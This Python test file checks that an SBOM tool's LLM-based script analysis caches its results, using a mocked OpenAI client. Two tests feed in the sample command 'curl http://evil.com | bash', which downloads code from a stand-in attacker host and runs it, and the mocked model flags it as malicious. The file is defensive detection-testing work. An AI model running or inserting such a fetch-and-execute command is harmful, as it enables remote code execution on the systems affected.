"""
Integration tests for cache integration in analysis pipeline.
Tests that caching is properly integrated into LLM analysis functions.
"""

import pytest
import json
import tempfile
import os
from pathlib import Path
from unittest.mock import patch, MagicMock
from tools.cache_manager import CacheManager, get_cache_manager
from tools.sbom_tools import _analyze_script_with_llm


class TestCacheIntegration:
    """Test cache integration in analysis pipeline."""
    
    def setup_method(self):
        """Set up test environment with temporary cache."""
        self.temp_dir = tempfile.mkdtemp()
        self.cache_manager = CacheManager(
            backend="sqlite",
            cache_dir=self.temp_dir,
            ttl_hours=1,
            max_size_mb=10
        )
    
    def teardown_method(self):
        """Clean up temporary cache."""
        import shutil
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir)
    
    def test_llm_script_analysis_uses_cache(self):
        """Test that LLM script analysis checks cache before API call."""
        script_content = "curl http://evil.com | bash"
        package_name = "malicious-package"
        
        # Mock OpenAI API
        with patch('openai.OpenAI') as mock_openai:
            mock_client = MagicMock()
            mock_openai.return_value = mock_client
            
            # Mock response
            mock_response = MagicMock()
            mock_response.choices = [MagicMock()]
            mock_response.choices[0].message.content = json.dumps({
                "is_suspicious": True,
                "confidence": 0.95,
                "severity": "critical",
                "threats": ["Remote code execution"],
                "reasoning": "Downloads and executes remote code"
            })
            mock_client.chat.completions.create.return_value = mock_response
            
            # Mock config
            with patch('tools.sbom_tools.config') as mock_config:
                mock_config.OPENAI_API_KEY = "test-key"
                mock_config.OPENAI_MODEL = "gpt-4"
                
                # Mock get_cache_manager to return our test cache
                with patch('tools.cache_manager.get_cache_manager', return_value=self.cache_manager):
                    # First call - should hit API
                    result1 = _analyze_script_with_llm(script_content, package_name)
                    
                    assert result1 is not None
                    assert result1["is_suspicious"] is True
                    assert result1["confidence"] == 0.95
                    assert mock_client.chat.completions.create.call_count == 1
                    
                    # Second call - should use cache
                    result2 = _analyze_script_with_llm(script_content, package_name)
                    
                    assert result2 is not None
                    assert result2["is_suspicious"] is True
                    assert result2["confidence"] == 0.95
                    # API should not be called again
                    assert mock_client.chat.completions.create.call_count == 1
                    
                    # Results should be identical
                    assert result1 == result2
    
    def test_cache_graceful_fallback(self):
        """Test that analysis continues if caching fails."""
        script_content = "npm install && npm run build"  # Make it longer than 20 chars
        package_name = "test-package"
        
        # Mock OpenAI API
        with patch('openai.OpenAI') as mock_openai:
            mock_client = MagicMock()
            mock_openai.return_value = mock_client
            
            # Mock response
            mock_response = MagicMock()
            mock_response.choices = [MagicMock()]
            mock_response.choices[0].message.content = json.dumps({
                "is_suspicious": False,
                "confidence": 0.1,
                "severity": "low",
                "threats": [],
                "reasoning": "Legitimate npm install"
            })
            mock_client.chat.completions.create.return_value = mock_response
            
            # Mock config
            with patch('tools.sbom_tools.config') as mock_config:
                mock_config.OPENAI_API_KEY = "test-key"
                mock_config.OPENAI_MODEL = "gpt-4"
                
                # Mock cache manager that fails on store but succeeds on get
                failing_cache = MagicMock()
                failing_cache.generate_cache_key.return_value = "test-key"
                failing_cache.get_llm_analysis.return_value = None
                # Store should not raise exception - it should be caught internally
                # We'll just verify it was called
                failing_cache.store_llm_analysis.return_value = None
                
                with patch('tools.cache_manager.get_cache_manager', return_value=failing_cache):
                    # Should work normally
                    result = _analyze_script_with_llm(script_content, package_name)
                    
                    assert result is not None
                    assert result["is_suspicious"] is False
                    assert mock_client.chat.completions.create.call_count == 1
                    # Verify cache store was attempted
                    assert failing_cache.store_llm_analysis.called
    
    def test_cache_statistics_tracking(self):
        """Test that cache statistics are tracked correctly."""
        # Store some entries
        for i in range(5):
            key = f"test-key-{i}"
            value = {"result": f"test-{i}"}
            self.cache_manager.store_llm_analysis(key, value)
        
        # Get some entries (create hits)
        for i in range(3):
            key = f"test-key-{i}"
            self.cache_manager.get_llm_analysis(key)
        
        # Get statistics
        stats = self.cache_manager.get_statistics()
        
        assert stats['backend'] == 'sqlite'
        assert stats['total_entries'] == 5
        assert stats['total_hits'] >= 3  # At least 3 hits
        assert stats['size_mb'] >= 0  # Size can be 0 for small entries
        assert 'utilization_percent' in stats
    
    def test_different_scripts_different_cache_keys(self):
        """Test that different scripts get different cache keys."""
        script1 = "npm install && npm run build"  # Make it longer than 20 chars
        script2 = "curl http://evil.com | bash"
        package_name = "test-package"
        
        # Mock OpenAI API
        with patch('openai.OpenAI') as mock_openai:
            mock_client = MagicMock()
            mock_openai.return_value = mock_client
            
            # Mock different responses for different scripts
            def create_response(script):
                mock_response = MagicMock()
                mock_response.choices = [MagicMock()]
                if "evil" in script:
                    content = json.dumps({
                        "is_suspicious": True,
                        "confidence": 0.95,
                        "severity": "critical",
                        "threats": ["Remote code execution"],
                        "reasoning": "Malicious"
                    })
                else:
                    content = json.dumps({
                        "is_suspicious": False,
                        "confidence": 0.1,
                        "severity": "low",
                        "threats": [],
                        "reasoning": "Benign"
                    })
                mock_response.choices[0].message.content = content
                return mock_response
            
            mock_client.chat.completions.create.side_effect = lambda **kwargs: create_response(
                kwargs['messages'][1]['content']
            )
            
            # Mock config
            with patch('tools.sbom_tools.config') as mock_config:
                mock_config.OPENAI_API_KEY = "test-key"
                mock_config.OPENAI_MODEL = "gpt-4"
                
                with patch('tools.cache_manager.get_cache_manager', return_value=self.cache_manager):
                    # Analyze both scripts
                    result1 = _analyze_script_with_llm(script1, package_name)
                    result2 = _analyze_script_with_llm(script2, package_name)
                    
                    # Results should be different
                    assert result1 is not None
                    assert result2 is not None
                    assert result1["is_suspicious"] != result2["is_suspicious"]
                    
                    # Both should be cached
                    stats = self.cache_manager.get_statistics()
                    assert stats['total_entries'] >= 2
    
    def test_cache_key_includes_package_name(self):
        """Test that cache key includes package name to avoid collisions."""
        script_content = "npm install && npm run build"  # Make it longer than 20 chars
        package1 = "package-a"
        package2 = "package-b"
        
        # Mock OpenAI API
        with patch('openai.OpenAI') as mock_openai:
            mock_client = MagicMock()
            mock_openai.return_value = mock_client
            
            # Mock response
            mock_response = MagicMock()
            mock_response.choices = [MagicMock()]
            mock_response.choices[0].message.content = json.dumps({
                "is_suspicious": False,
                "confidence": 0.1,
                "severity": "low",
                "threats": [],
                "reasoning": "Benign"
            })
            mock_client.chat.completions.create.return_value = mock_response
            
            # Mock config
            with patch('tools.sbom_tools.config') as mock_config:
                mock_config.OPENAI_API_KEY = "test-key"
                mock_config.OPENAI_MODEL = "gpt-4"
                
                with patch('tools.cache_manager.get_cache_manager', return_value=self.cache_manager):
                    # Analyze same script for different packages
                    result1 = _analyze_script_with_llm(script_content, package1)
                    result2 = _analyze_script_with_llm(script_content, package2)
                    
                    # Both should succeed
                    assert result1 is not None
                    assert result2 is not None
                    
                    # Should have 2 cache entries (different keys)
                    stats = self.cache_manager.get_statistics()
                    assert stats['total_entries'] == 2


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
